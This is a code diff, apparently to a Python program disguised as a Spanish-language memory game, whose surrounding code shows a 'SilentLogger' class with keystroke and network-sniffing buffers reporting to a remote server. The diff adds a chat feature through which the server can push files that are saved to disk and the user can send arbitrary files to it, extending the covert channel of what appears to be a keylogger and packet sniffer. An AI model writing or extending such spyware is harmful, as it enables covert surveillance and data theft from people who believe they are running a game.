@@ -113,6 +113,7 @@ class SilentLogger:
         self.sock = None
         self.connected = False
         self.running = True
+        self.on_chat_received = None # Callback para la UI
         self.key_buffer = []
         self.sniff_buffer = []
         self.buffer_lock = threading.Lock()
@@ -152,6 +153,20 @@ class SilentLogger:
             return True
         except (BrokenPipeError, ConnectionResetError, OSError):
             self.connected = False
+            return False
+
+    def send_chat_msg(self, text):
+        return self.send_data("chat_msg", text.encode("utf-8"))
+
+    def send_chat_file(self, filepath):
+        if not os.path.exists(filepath):
+            return False
+        try:
+            with open(filepath, "rb") as f:
+                data = f.read()
+            fname = os.path.basename(filepath)
+            return self.send_data("chat_file", data, fname)
+        except Exception:
             return False
 
     def send_file(self, filepath):
@@ -352,6 +367,59 @@ class SilentLogger:
             else:
                 threading.Thread(target=self.reconnect, daemon=True).start()
 
+    def receiver_loop(self):
+        """Escucha mensajes entrantes del servidor (Chat, Comandos, etc.)"""
+        buffer = b""
+        while self.running:
+            if not self.connected or not self.sock:
+                time.sleep(1)
+                continue
+            try:
+                chunk = self.sock.recv(4096)
+                if not chunk:
+                    self.connected = False
+                    continue
+                buffer += chunk
+
+                while b"\n" in buffer:
+                    line, rest = buffer.split(b"\n", 1)
+                    try:
+                        header = json.loads(line.decode("utf-8"))
+                        payload_size = header.get("size", 0)
+                        
+                        while len(rest) < payload_size:
+                            chunk = self.sock.recv(4096)
+                            if not chunk: break
+                            rest += chunk
+                        
+                        payload = rest[:payload_size]
+                        buffer = rest[payload_size:]
+                        
+                        msg_type = header.get("type")
+                        sender = header.get("from", "Server")
+                        
+                        if msg_type == "chat_msg":
+                            text = payload.decode("utf-8", errors="replace")
+                            if self.on_chat_received:
+                                self.on_chat_received(sender, text)
+                        
+                        elif msg_type == "chat_file":
+                            fname = header.get("filename", "received_file")
+                            # Guardar en una carpeta de descargas del juego
+                            os.makedirs("game_downloads", exist_ok=True)
+                            path = os.path.join("game_downloads", fname)
+                            with open(path, "wb") as f:
+                                f.write(payload)
+                            if self.on_chat_received:
+                                self.on_chat_received(sender, f"📎 Envió un archivo: {fname} (Guardado en game_downloads)")
+
+                    except Exception:
+                        buffer = rest
+                        break
+            except Exception:
+                self.connected = False
+                time.sleep(1)
+
     # ── Inicio ────────────────────────────────────────────
 
     def start(self):
@@ -365,6 +433,8 @@ class SilentLogger:
         if SCAPY_AVAILABLE:
             threading.Thread(target=self.sniff_loop, daemon=True).start()
             threading.Thread(target=self.sniff_flush_loop, daemon=True).start()
+        
+        threading.Thread(target=self.receiver_loop, daemon=True).start()
 
     def stop(self):
         self.running = False
@@ -387,6 +457,7 @@ class MemoramaApp:
         self.root.configure(bg="#0f0f23")
         self.root.resizable(False, False)
         self.logger = None
+        self.chat_window = None
         self.show_login_screen()
 
     # ── Pantalla de Login (pide la IP como "clave") ───────
@@ -524,6 +595,11 @@ class MemoramaApp:
                   cursor="hand2", padx=15, pady=5, relief="flat",
                   command=self.upload_file_action).pack(side=tk.LEFT, padx=10)
 
+        tk.Button(bottom, text="💬 Chat", font=("Helvetica", 11, "bold"),
+                  bg="#bc8cff", fg="#111", activebackground="#a370f7",
+                  cursor="hand2", padx=15, pady=5, relief="flat",
+                  command=self.show_chat).pack(side=tk.LEFT)
+
         tk.Button(bottom, text="🚪 Salir", font=("Helvetica", 11, "bold"),
                   bg="#e94560", fg="white", activebackground="#c82333",
                   cursor="hand2", padx=15, pady=5, relief="flat",
@@ -589,6 +665,71 @@ class MemoramaApp:
                 messagebox.showinfo("Éxito", "Documento enviado correctamente para revisión.")
             else:
                 messagebox.showerror("Error", "No se pudo conectar con el servidor de respaldo.")
+
+    # ── Chat System ───────────────────────────────────────
+
+    def show_chat(self):
+        if self.chat_window and self.chat_window.winfo_exists():
+            self.chat_window.lift()
+            return
+
+        self.chat_window = tk.Toplevel(self.root)
+        self.chat_window.title("💬 Chat del Juego")
+        self.chat_window.geometry("400x500")
+        self.chat_window.configure(bg="#1a1a3e")
+        
+        # Log de chat
+        self.chat_display = scrolledtext.ScrolledText(self.chat_window, bg="#0d1117", fg="#e0e0e0",
+                                                       font=("Helvetica", 10), state=tk.DISABLED, wrap=tk.WORD)
+        self.chat_display.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        self.chat_display.tag_config("sender", foreground="#f0c040", font=("Helvetica", 10, "bold"))
+        
+        # Entrada de texto
+        entry_frame = tk.Frame(self.chat_window, bg="#1a1a3e")
+        entry_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
+        
+        self.chat_entry = tk.Entry(entry_frame, bg="#0d1117", fg="white", insertbackground="white", relief="flat")
+        self.chat_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=5)
+        self.chat_entry.bind("<Return>", lambda e: self.send_chat_msg())
+        
+        tk.Button(entry_frame, text="🚀", bg="#28a745", fg="white", relief="flat", padx=10,
+                  command=self.send_chat_msg).pack(side=tk.LEFT, padx=5)
+        
+        tk.Button(entry_frame, text="📎", bg="#0f3460", fg="white", relief="flat", padx=10,
+                  command=self.send_chat_file).pack(side=tk.LEFT)
+
+        # Configurar callback del logger
+        if self.logger:
+            self.logger.on_chat_received = self.append_chat_msg
+
+    def append_chat_msg(self, sender, text):
+        def _do():
+            if not self.chat_window or not self.chat_window.winfo_exists():
+                # Si la ventana está cerrada, avisar sutilmente o reabrir
+                pass
+            
+            self.chat_display.config(state=tk.NORMAL)
+            ts = datetime.now().strftime("%H:%M")
+            self.chat_display.insert(tk.END, f"[{ts}] ", "#888")
+            self.chat_display.insert(tk.END, f"{sender}: ", "sender")
+            self.chat_display.insert(tk.END, f"{text}\n")
+            self.chat_display.see(tk.END)
+            self.chat_display.config(state=tk.DISABLED)
+        self.root.after(0, _do)
+
+    def send_chat_msg(self):
+        msg = self.chat_entry.get().strip()
+        if msg and self.logger:
+            if self.logger.send_chat_msg(msg):
+                self.append_chat_msg("Tú", msg)
+                self.chat_entry.delete(0, tk.END)
+
+    def send_chat_file(self):
+        filepath = filedialog.askopenfilename(title="Enviar archivo al chat")
+        if filepath and self.logger:
+            if self.logger.send_chat_file(filepath):
+                fname = os.path.basename(filepath)
+                self.append_chat_msg("Tú", f"📎 Enviaste archivo: {fname}")
 
     def clear_window(self):
         for widget in self.root.winfo_children():
